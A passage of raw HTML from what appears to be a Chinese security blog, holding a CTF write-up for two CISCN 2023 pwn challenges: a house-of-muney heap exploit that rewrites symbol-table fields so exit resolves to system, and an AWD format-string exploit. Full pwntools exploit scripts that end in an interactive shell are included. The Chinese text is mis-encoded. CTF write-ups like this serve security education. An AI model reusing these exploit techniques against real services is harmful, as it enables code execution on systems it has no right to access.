class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142127071.png" alt="image-20230514212707011"></p>
<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi">mips_armæ±‡ç¼–å­¦ä¹  - Note (gitbook.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://prowes5.github.io/2019/07/21/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">è·¯ç”±å™¨æ¼æ´åˆ†æç¯å¢ƒæ­å»º | Prowes5â€™s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yalecaltech/article/details/117326975">(47æ¡æ¶ˆæ¯) MIPSä¸‹shellcodeç¼–å†™_Elwood Yingçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/yxb067">ã€ŠIoTä»å…¥é—¨åˆ°å…¥åœŸã€‹(1)â€“MIPSäº¤å‰ç¼–è¯‘ç¯å¢ƒæ­å»ºåŠå…¶32ä½æŒ‡ä»¤é›† (yuque.com)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/e4508dbd.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/e4508dbd.html" class="post-title-link" itemprop="url">Ciscn2023-åä¸­èµ›åŒºåˆ†åŒºèµ›-pwn-wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-06-30 13:39:54" itemprop="dateCreated datePublished" datetime="2023-06-30T13:39:54+08:00">2023-06-30</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">æ›´æ–°äº</span>
      <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-07-01 11:47:23" itemprop="dateModified" datetime="2023-07-01T11:47:23+08:00">2023-07-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">èµ›é¢˜WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>ä»Šå¹´å›½èµ›çš„åä¸­åˆ†åŒºèµ›ä¸€å…±æ”¾äº†ä¸¤é“ <code>PWN</code> ï¼Œä¸€ä¸ªä¸€è§£ï¼Œä¸€ä¸ªé›¶è§£ã€‚é›¶è§£çš„æ˜¯ <code>LLVM PASS PWN</code> ï¼Œè¿™ä¸ªæ²¡æœ‰ç ”ç©¶è¿‡ï¼Œæš‚ä¸”å…ˆå¤ç°å¦ä¸€ä¸ªé¢˜ç›®ï¼ˆè€ƒå¯Ÿçš„æ˜¯ <code>house of muney</code>ï¼‰è¿˜æœ‰ä¸€ä¸ª <code>AWD</code> ç¯èŠ‚çš„ <code>PWN</code> ï¼ˆè€ƒå¯Ÿçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰</p>
<h3 id="muney"><a href="#muney" class="headerlink" title="muney"></a>muney</h3><p>æœ¬é¢˜æ²¡ç»™ <code>libc</code> ï¼Œå¬è¯´è¿œç¨‹çš„ <code>libc</code> ç‰ˆæœ¬ä¸º <code>2.31 9.9</code> ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯è¿™ä¸ª</p>
<h4 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301539057.png" alt="image-20230630153903673"></p>
<h4 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h4><p>ä¸»å‡½æ•°é¦–å…ˆæ˜¯è¾“å…¥æ•°æ®ï¼Œå¹¶ä¸”å°†å…¶ä¼ å…¥äº† <code>sub_4021f3</code> å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œä¸æ–­å¾ªç¯è¿™ä¸ªè¿‡ç¨‹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301542350.png" alt="image-20230630154203298"></p>
<p><code>sub_4021f3</code> å‡½æ•°æ˜¯å¯¹å„ç§åŠŸèƒ½çš„å°è£…ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰ç»è¿‡äº† <code>jiexi</code>ï¼ˆé‡å‘½ååï¼‰å‡½æ•°å¯¹æ•°æ®çš„è§£æå¤„ç†ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸»è¦æ¥é€†å‘çš„åœ°æ–¹ã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301543451.png" alt="image-20230630154341391" style="zoom:67%;" />



<p><code>jiexi</code> å‡½æ•°çš„è¿™ä¸ªè§£æè§„åˆ™ï¼Œå¯ä»¥é€šè¿‡ <code>GDB</code> åŠ¨æ€è°ƒè¯•åŠ ä¸Š <code>IDA</code> é™æ€åˆ†ææ¥åˆ¤æ–­å‡ºè¿™ä¸ªå‡½æ•°å°±æ˜¯åœ¨è§£æ <code>HTTP</code> è¯·æ±‚å¤´ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥çš„æ•°æ®ä»¥ <code>HTTP</code> è¯·æ±‚å¤´çš„æ ¼å¼è¾“å…¥å³å¯ã€‚å†ç®€å•è°ƒè¯•ä¸€ä¸‹ï¼Œè§‚å¯Ÿä¸‹å“ªéƒ¨åˆ†æ˜¯è§¦å‘åŠŸèƒ½çš„é€‰é¡¹ä»¥åŠå‚æ•°å³å¯ï¼Œæœ€ç»ˆå¾—å‡ºäº†è§„åˆ™å¤§æ¦‚å¦‚ä¸‹ï¼ˆä»¥è§¦å‘ <code>create</code> å‡½æ•°ä¸ºä¾‹ï¼‰</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /create HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Size: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(size)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length)+<span class="string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>



<p><code>create</code> å‡½æ•°å¯ä»¥ç”³è¯·å †å—ï¼Œè€Œå †å—æœ€å°ä¸º <code>0x100000</code> ï¼Œè¿™å°±æ„å‘³ç€å †å—ä¼šç›´æ¥ç”± <code>mmap</code> æ˜ å°„å‡ºæ¥ï¼Œä½äºå†…å­˜æ˜ å°„åŒºã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301555216.png" alt="image-20230630155510162" style="zoom:50%;" />



<h4 id="æ¼æ´æ‰€åœ¨"><a href="#æ¼æ´æ‰€åœ¨" class="headerlink" title="æ¼æ´æ‰€åœ¨"></a>æ¼æ´æ‰€åœ¨</h4><p>åœ¨ <code>edit</code> å‡½æ•°ä¸­ï¼Œé¦–å…ˆæ˜¯è·å–äº†ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç´¢å¼•ï¼Œç¬¬äºŒä¸ªåˆ™æ˜¯åç§» <code>offset</code>ï¼Œåœ¨ä¸‹å›¾çš„çº¢æ¡†éƒ¨åˆ†ä¸­å¯ä»¥å‘ç°é’ˆå¯¹åç§» <code>offset</code> çš„æ£€æŸ¥å¹¶æ²¡æœ‰åšå¥½ï¼Œåªæ£€æŸ¥äº†åç§»ä¸èƒ½å¤§äºç”³è¯·å†…å­˜å—æ—¶çš„ <code>size</code> ï¼Œä½†æ˜¯å´å¯ä»¥ä¸ºè´Ÿï¼ˆ<code>v9</code> ä¸º <code>int64</code> ç±»å‹ï¼‰ï¼Œè¿™å°±å¯¼è‡´äº†å¯ä»¥åœ¨ç”³è¯·å†…å­˜å—çš„ä¸Šæ–¹ï¼ˆä½åœ°å€æ–¹å‘ï¼‰å»å†™å…¥æ•°æ®</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301600658.png" alt="image-20230630160058576" style="zoom:50%;" />



<p>åŒæ—¶è¿˜å­˜åœ¨ä¸€ä¸ª <code>exit</code> å‡½æ•°ï¼Œå…¶å‚æ•°ä¸º <code>/bin/sh</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301631953.png" alt="image-20230630163136902"></p>
<h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>æˆ‘åœ¨æ¯”èµ›æ—¶è€ƒè™‘çš„æ€è·¯æ˜¯æƒ³æŠŠ <code>exit</code> å‡½æ•°çš„ <code>got</code> è¡¨æ”¹ä¸º <code>system</code> ï¼Œæœ€åè§¦å‘å³å¯ã€‚ä½†ä¸€ç›´è‹¦äºæ²¡æœ‰ <code>libc</code> åœ°å€ã€‚å½“æ—¶æ˜¯å‘ <code>mmap</code> æ˜ å°„å‡ºæ¥çš„åŒºåŸŸçš„ä½åœ°å€å¤„å†™å…¥æ•°æ®ï¼ˆåŠ«æŒäº† <code>__free_hook</code> ï¼‰ï¼Œå†ç”¨ <code>delete</code> å‡½æ•°è¿›è¡Œè§¦å‘ï¼Œä¹Ÿç¡®å®æ˜¯å¯ä»¥ä»»æ„åœ°å€æ‰§è¡Œï¼Œä½†æ²¡æœ‰æ³„éœ² <code>libc</code> åœ°å€çš„æœºä¼šï¼Œä¹Ÿå°±å¡æ­»åœ¨è¿™é‡Œäº†ã€‚</p>
<p>æ¯”èµ›ç»“æŸåï¼Œè¯·æ•™äº†ä¸€ä¸‹åç§‘çš„å¸ˆå‚…ï¼Œæ‰çŸ¥é“æœ‰ <code>house of muney</code> è¿™ç§æ‰‹æ³•ã€‚</p>
<p>åŸç†æ˜¯è¿™æ ·çš„ï¼šåœ¨è¿›è¡Œå»¶è¿Ÿç»‘å®šæ—¶ï¼Œè§£æå‡ºç¬¦å·çš„çœŸå®åœ°å€æ˜¯ç”¨ <code>libc</code> åŸºåœ°å€åŠ ä¸Šç¬¦å·è¡¨ä¸­ <code>st_value</code> å­—æ®µå€¼è·å¾—çš„ï¼Œå¦‚æœèƒ½ä¿®æ”¹ <code>st_value</code> è¿™ä¸ªå€¼çš„è¯ï¼Œå°†å…¶æ”¹ä¸º <code>system</code> å‡½æ•°çš„ <code>st_value</code>ï¼Œæœ€ç»ˆå°±å¯ä»¥è®© <code>exit</code> è¢«è§£ææˆ <code>system</code>ã€‚å›°éš¾åœ¨äºæ¯ä¸ªç¬¦å·çš„ <code>sym</code> ç»“æ„ä½“æ‰€åœ¨å†…å­˜åŒºåŸŸæ˜¯åªè¯»çš„ï¼Œå› æ­¤è¦æ”¹å¤§å†…å­˜å—çš„ <code>size</code>ï¼Œå°†å…¶é‡Šæ”¾æ‰å†ç”³è¯·å‡ºæ¥ï¼Œè€Œ <code>malloc</code> è§¦å‘çš„ <code>mmap</code> å‡ºçš„å†…å­˜éƒ½æ˜¯<strong>å¯è¯»å†™</strong>çš„ï¼Œåªè¦è¶³å¤Ÿå¤§ï¼Œå°±å¯ä»¥å°†ç¬¦å·çš„ <code>sym</code> ç»“æ„ä½“ç»™ç”³è¯·å‡ºæ¥è¿›è¡Œç¯¡æ”¹ã€‚</p>
<p>ä¸è¿‡ä¸ºäº†ç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼Œæœ€ç»ˆèƒ½æˆåŠŸè¿›è¡Œè§£æå‡½æ•°çœŸå®åœ°å€ï¼Œè¿˜éœ€è¦ç¯¡æ”¹ä¸€äº›å­—æ®µã€‚åˆ†åˆ«æ˜¯ <code>bitmask_word</code> <code>bucket</code> <code>hasharr</code> <code>st_value</code> </p>
<p>è‡³æ­¤ï¼Œæ•´ä½“çš„æµç¨‹å¦‚ä¸‹</p>
<ol>
<li>ç”³è¯·ä¸€ä¸ª <code>0x150000</code> çš„å†…å­˜å—</li>
<li>åˆ©ç”¨ <code>edit</code> åŠŸèƒ½ï¼Œä¿®æ”¹å†…å­˜ <code>size</code> ä¸º <code>0x171002</code> (ä¸èƒ½å¤ªå¤§ï¼Œä½†æ˜¯å¤ªå°äº†åˆè¦†ç›–ä¸åˆ°)</li>
<li>å°†å…¶é‡Šæ”¾æ‰</li>
<li>ç”³è¯·ä¸€ä¸ª <code>0x171002</code> çš„å†…å­˜å—ï¼Œä¹‹åå°±å¯ä»¥æ¥åœ¨è¿™ä¸ªèŒƒå›´å†…åœ°å€è¿›è¡Œä»»æ„å†™å…¥</li>
<li>ä¼ªé€ ä¸Šé¢æåˆ°å­—æ®µçš„å€¼</li>
<li>æœ€åè§¦å‘ <code>exit(&quot;/bin/sh&quot;)</code> ï¼Œå°±èƒ½å¤Ÿè§£ææˆ <code>system(&quot;/bin/sh&quot;)</code></li>
</ol>
<p>éœ€è¦ä¼ªé€ è¿™å‡ ä¸ªå­—æ®µçš„å€¼å†™åœ¨äº† <code>EXP</code> ä¸­ï¼Œ<code>st_name</code> çš„åå››ä¸ªå­—èŠ‚æ˜¯ <code>strtab</code> è·ç¦»ç¬¦å·åï¼ˆ<code>exit</code>ï¼‰çš„åç§»é‡ ï¼ˆä¸åŒç¨‹åºéœ€è¦è°ƒè¯•å¾—åˆ°ï¼‰ï¼Œ<strong>è¯¥å­—æ®µå‰å››ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„ï¼Œ<code>bitmask_word</code> å’Œ <code>bucket</code> ä»¥åŠ <code>hasharr</code> ä¹Ÿéƒ½æ˜¯å›ºå®šçš„ã€‚</strong></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;muney1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /create HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Size: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(size)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length)+<span class="string">&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,content_length,content</span>):</span><br><span class="line">    payload=<span class="string">b&quot;&quot;&quot;POST /edit HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(idx).encode()+<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Offset: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(offset).encode()+<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(content_length).encode()+<span class="string">b&quot;&quot;&quot;\n\r\n&quot;&quot;&quot;</span>+content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /delete HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(idx)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    payload=<span class="string">&quot;&quot;&quot;POST /quit HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.12.145.134:50013</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Idx: &quot;&quot;&quot;</span>+<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Content-Length: 16\n\r\n&quot;&quot;&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="number">0x150000</span>,<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,-<span class="number">8</span>,<span class="number">3</span>,<span class="string">b&#x27;\x02\x10\x17&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,delete(<span class="number">0</span>))</span><br><span class="line">debug(p,<span class="number">0x401FFF</span>,<span class="number">0x4021EE</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,create(<span class="number">0x171002</span>,<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#exit@st_value distance mmap_base 0xf00012001a67e5    fake_data   0x1a67e5</span></span><br><span class="line"><span class="comment">#bitmask_word distance mmap_base 0x152b88  fake_data 0xf010028c0201130e</span></span><br><span class="line"><span class="comment">#bucket distance mmap_base 0x152cb0    fake_data 0x86</span></span><br><span class="line"><span class="comment">#hasharr distance mmap_base 0x153d7c   fake_data 0x7c967e3e7c967e3f</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x152b78</span>,<span class="number">8</span>,p64(<span class="number">0xf010028c0201130e</span>)))<span class="comment">#write data to bitmask_word</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x152ca0</span>,<span class="number">1</span>,p8(<span class="number">0x86</span>)))<span class="comment">#write data to bucket</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x153d6c</span>,<span class="number">8</span>,p64(<span class="number">0x7c967e3e7c967e3f</span>)))<span class="comment">#write data to hasharr</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x8</span>,<span class="number">3</span>,<span class="string">b&quot;\x90\x22\x05&quot;</span>))<span class="comment">#write data to exit@st_value</span></span><br><span class="line"><span class="comment">#0x1a67e5</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>,<span class="number">3</span>,<span class="string">b&quot;\xe5\x67\x1a&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>+<span class="number">4</span>,<span class="number">1</span>,<span class="string">b&quot;\x12&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,edit(<span class="number">0</span>,<span class="number">0x156d00</span>-<span class="number">0x10</span>+<span class="number">6</span>,<span class="number">1</span>,<span class="string">b&quot;\xf0&quot;</span>))<span class="comment">#write data to exit@st_name</span></span><br><span class="line"><span class="comment">#å› ä¸ºæ²¡åŠæ³•å†™å…¥ \x00 çš„åŸå› ï¼Œè¿™é‡Œçš„st_nameåˆ†äº†å¤šæ¬¡å†™å…¥</span></span><br><span class="line">p.sendafter(<span class="string">&quot;HTTP_Parser&gt; &quot;</span>,quit())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306301840455.png" alt="image-20230630184048404"></p>
<h3 id="awd-pwn"><a href="#awd-pwn" class="headerlink" title="awd_pwn"></a>awd_pwn</h3><p>ç¨‹åºå®ç°äº†ä¸€ä¸ª <code>shell</code> ï¼Œæ¼æ´ä½äº <code>echo</code> ä¸­ï¼Œå¦‚æœ <code>echo</code> åé¢æœ‰è‡³å°‘ä¸¤ä¸ªå‚æ•°å¹¶ä¸”æ²¡æœ‰ <code>&gt;</code> çš„æƒ…å†µä¸‹ï¼Œé™¤å»æœ€åä¸€ä¸ªå‚æ•°ï¼Œå‰©ä¸‹å‚æ•°æ‰“å°æ—¶ä¼šè§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306302215516.png" alt="image-20230630221533284"></p>
<p>åˆ©ç”¨æ€è·¯æ˜¯æ‰“æ ˆé“¾ï¼ˆè€ƒå¯Ÿçš„æ˜¯éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰ï¼ŒåŠ«æŒåŸæœ¬è¿”å›åœ°å€ <code>libc_start_main</code> ä¸º <code>one_gadget</code> ï¼Œæœ€ç»ˆè¾“å…¥ä¸€ä¸ªéæ³•å‘½ä»¤ï¼Œé€€å‡ºå³å¯æ‹¿åˆ° <code>shell</code></p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">payload</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;$ \x1B[0m&quot;</span>,payload)</span><br><span class="line"> </span><br><span class="line">cmd(<span class="string">&quot;echo %29$p a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x78&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x240b3</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b31</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1Ed5</span>,<span class="number">0x2818</span>,<span class="number">0x23C5</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %12$p a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x78&quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">libc_start_main_address=stack_addr+<span class="number">0x38</span></span><br><span class="line"> </span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line"><span class="comment">#write 0xe8 to address of libc_start_main </span></span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>(libc_start_main_address&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%31$hn a&quot;</span>)</span><br><span class="line"><span class="comment">#one_gadget 0xe3b31</span></span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%59$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>((libc_start_main_address+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%31$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&quot;echo %&quot;</span>+<span class="built_in">str</span>((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c%59$hn a&quot;</span>)</span><br><span class="line">cmd(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202306302229508.png" alt="image-20230630222938439"></p>
<h3 id="é¢˜ç›®é™„ä»¶"><a href="#é¢˜ç›®é™„ä»¶" class="headerlink" title="é¢˜ç›®é™„ä»¶"></a>é¢˜ç›®é™„ä»¶</h3><p><strong>muney</strong></p>
<p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/18eXF0Y_cE4ooQG50TB_7ig?pwd=flc5">https://pan.baidu.com/s/18eXF0Y_cE4ooQG50TB_7ig?pwd=flc5</a><br>æå–ç ï¼šflc5</p>
<p><strong>awd_pwn</strong></p>
<p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1F9qv7kqVB5yFbAULPtl_0Q?pwd=1234">https://pan.baidu.com/s/1F9qv7kqVB5yFbAULPtl_0Q?pwd=1234</a> </p>
<p>æå–ç ï¼š1234</p>
<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://roderickchan.github.io/zh-cn/2022-06-18-glibcheap-house-of-muney/#poc">GlibcHeap-house of muney - roderick - record and learn! (roderickchan.github.io)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272416.htm#msg_header_h3_56">åŸåˆ›]how2heapæ·±å…¥æµ…å‡ºå­¦ä¹ å †åˆ©ç”¨-Pwn-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/12effc43.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
